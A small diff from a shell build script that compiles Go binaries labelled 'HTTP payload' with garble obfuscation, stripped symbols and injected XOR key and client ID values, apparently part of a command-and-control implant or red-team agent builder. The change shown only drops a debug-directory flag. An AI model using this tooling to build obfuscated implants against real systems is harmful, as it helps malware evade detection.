@@ -399,7 +399,7 @@ build_binary() {
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     else
         # HTTP payload - full ldflags
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build \
             -ldflags "-w -s -buildid= \
             -X 'main.xorKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
